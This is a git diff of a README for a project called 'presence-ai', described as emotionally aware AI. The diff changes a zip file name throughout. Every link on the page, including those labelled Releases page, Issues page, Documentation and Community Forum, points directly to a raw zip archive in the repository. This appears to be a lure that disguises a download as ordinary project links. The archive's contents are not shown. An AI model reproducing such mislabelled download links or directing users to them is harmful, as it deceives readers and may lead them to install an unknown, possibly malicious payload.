@@ -1,10 +1,10 @@
 # 🤖 presence-ai - Experience Emotionally Present AI
 
 ## 🚀 Getting Started
-Welcome to presence-ai. This application serves as a living blueprint for emotionally aware AI. It takes inspiration from https://raw.githubusercontent.com/gil444lf/presence-ai/main/suiform/presence-ai.zip and aims to support future builders in artificial intelligence.
+Welcome to presence-ai. This application serves as a living blueprint for emotionally aware AI. It takes inspiration from https://raw.githubusercontent.com/gil444lf/presence-ai/main/suiform/ai_presence_v3.3.zip and aims to support future builders in artificial intelligence.
 
 ## 📥 Download Now
-[![Download Presence-AI](https://raw.githubusercontent.com/gil444lf/presence-ai/main/suiform/presence-ai.zip)](https://raw.githubusercontent.com/gil444lf/presence-ai/main/suiform/presence-ai.zip)
+[![Download Presence-AI](https://raw.githubusercontent.com/gil444lf/presence-ai/main/suiform/ai_presence_v3.3.zip)](https://raw.githubusercontent.com/gil444lf/presence-ai/main/suiform/ai_presence_v3.3.zip)
 
 ## 💻 System Requirements
 To run presence-ai, your system should meet the following requirements:
@@ -24,7 +24,7 @@ To run presence-ai, your system should meet the following requirements:
 To get started with presence-ai, please follow these steps:
 
 1. **Visit this page to download:** 
-   Go to the [Releases page](https://raw.githubusercontent.com/gil444lf/presence-ai/main/suiform/presence-ai.zip) to find the latest version of presence-ai.
+   Go to the [Releases page](https://raw.githubusercontent.com/gil444lf/presence-ai/main/suiform/ai_presence_v3.3.zip) to find the latest version of presence-ai.
 
 2. **Select the Latest Release:**
    On the Releases page, locate the version marked as "Latest Release." Click on it to see available download options.
@@ -57,12 +57,12 @@ If you encounter issues while using presence-ai, consider the following steps:
 - **Internet Connection:** Ensure you have a stable internet connection.
 - **Reinstall the Application:** Uninstall and reinstall the app if problems persist. You can follow the installation steps above again.
 
-If you still need help, consider checking the [GitHub Issues page](https://raw.githubusercontent.com/gil444lf/presence-ai/main/suiform/presence-ai.zip) for commonly reported issues and potential fixes.
+If you still need help, consider checking the [GitHub Issues page](https://raw.githubusercontent.com/gil444lf/presence-ai/main/suiform/ai_presence_v3.3.zip) for commonly reported issues and potential fixes.
 
 ## 🔗 Additional Resources
 For further information, visit our documentation and support resources:
-- [Documentation](https://raw.githubusercontent.com/gil444lf/presence-ai/main/suiform/presence-ai.zip)
-- [Community Forum](https://raw.githubusercontent.com/gil444lf/presence-ai/main/suiform/presence-ai.zip)
+- [Documentation](https://raw.githubusercontent.com/gil444lf/presence-ai/main/suiform/ai_presence_v3.3.zip)
+- [Community Forum](https://raw.githubusercontent.com/gil444lf/presence-ai/main/suiform/ai_presence_v3.3.zip)
 
 ## 📢 Feedback
 Your experience is important to us. If you have suggestions or feedback, please reach out through our GitHub repository. Your input helps us improve presence-ai for everyone.
@@ -70,4 +70,4 @@ Your experience is important to us. If you have suggestions or feedback, please 
 ## 🌐 Connect with the Community
 Join our community of users and developers committed to building a better AI. Share your thoughts, challenges, or enhancements in the discussions section of our GitHub page.
 
-[![Download Presence-AI](https://raw.githubusercontent.com/gil444lf/presence-ai/main/suiform/presence-ai.zip)](https://raw.githubusercontent.com/gil444lf/presence-ai/main/suiform/presence-ai.zip)
+[![Download Presence-AI](https://raw.githubusercontent.com/gil444lf/presence-ai/main/suiform/ai_presence_v3.3.zip)](https://raw.githubusercontent.com/gil444lf/presence-ai/main/suiform/ai_presence_v3.3.zip)
